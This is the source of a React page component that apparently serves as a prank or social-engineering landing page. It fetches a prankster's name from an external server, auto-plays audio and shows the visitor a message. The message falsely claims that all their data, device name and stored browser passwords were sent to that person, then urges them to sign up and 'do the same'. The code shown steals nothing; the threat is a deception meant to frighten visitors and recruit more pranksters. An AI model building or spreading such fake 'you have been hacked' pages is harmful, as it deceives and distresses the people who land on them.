import React, { useEffect, useState } from 'react';
import { useNavigate, useParams, Link} from 'react-router-dom'
import Cookie from 'js-cookie'
import copy from 'copy-to-clipboard'
function Laugh ()
{


        const {id} = useParams()

      const [ storefiles, setstorefiles ] = useState( [] )
      
        const navigate = useNavigate()
      

      useEffect( () =>
      {
            if ( Cookie.get( "_8log_in_cod_e" ) === id )
            {
                  navigate( "../" );
            }
               
            if ( !Cookie.get( "usrprev" ) )
            {
                  window.history.back();
            }
      } );



        useEffect( () =>
      { 

                  const formdata = new FormData();
                  formdata.append( "fetchdatas", 1 );
                  formdata.append( "sendcookie", id);



                  var xhr = new XMLHttpRequest();
                  xhr.open( "POST", "https://fetchauthen3.badzybaddest.repl.co/fetch.php", true );
            xhr.onload = function ()
            {
                  let getdat = JSON.parse( this.response );
                       
                  if ( getdat.name === "nouser" )
                  {
                        document.body.innerHTML = `<h1>Wrong Location</h1>`; 
                  }
                  else
                  {
                        getdat.map( ( mapval ) =>
                        {
                              setstorefiles( mapval );
                        } );
                  }
                       
                       

            };

              xhr.send( formdata );

           
            
        }, [] )
      
      const triggerplay = () =>
      {
            

            if ( 'mediaSession' in navigator )
            {
                  navigator.mediaSession.metadata = new MediaMetadata( {
                        title: 'Sapa Don Catch You Ooo',
                        artist: 'King of Sapa',
                        album: 'Welcome to Sapa World',
                        artwork: [
                              { src: 'https://i.pinimg.com/originals/e6/6e/bd/e66ebdb0c8bf2879528409205460ae20.jpg', sizes: '1101x1560', type: 'image/png' },
                              { src: 'https://i.pinimg.com/originals/e6/6e/bd/e66ebdb0c8bf2879528409205460ae20.jpg', sizes: '1101x1560', type: 'image/png' },
                              { src: 'https://i.pinimg.com/originals/e6/6e/bd/e66ebdb0c8bf2879528409205460ae20.jpg', sizes: '1101x1560', type: 'image/png' },
                              { src: 'https://i.pinimg.com/originals/e6/6e/bd/e66ebdb0c8bf2879528409205460ae20.jpg', sizes: '1101x1560', type: 'image/png' },
                              { src: 'https://i.pinimg.com/originals/e6/6e/bd/e66ebdb0c8bf2879528409205460ae20.jpg', sizes: '1101x1560', type: 'image/png' },
                              { src: 'https://i.pinimg.com/originals/e6/6e/bd/e66ebdb0c8bf2879528409205460ae20.jpg', sizes: '1101x1560', type: 'image/png' },
                        ]
                  } );



            }

      }

  return (
    <div className='noghai'>
      <title>Sapa Don Catch You Bro</title>
              <div className="video_container">
                    <audio autoPlay loop onPlay={triggerplay} playsInline controls src="https://www.xclusiveloaded.com/wp-content/uploads/2021/11/Sapa_No_Fit_Catch_Me_-_Nimix.mp3#t=0.001"></audio>
                    <div className="wanted_te">
                          <div className='shoz'>You Have been Fooled by { storefiles.fname + " " + storefiles.lname }</div>
                          <div> all your datas including you device name has been submited to { storefiles.fname + "'s" } home page and email. including all of your browsers stored passwords... </div>
                          <h5>Wanna Do The same? </h5>
                          <div className="joinhow">
                                <Link to="../Signup">Join Now</Link>
                          </div>
                    </div>
              </div>
              
    </div>
  )
}

export default Laugh
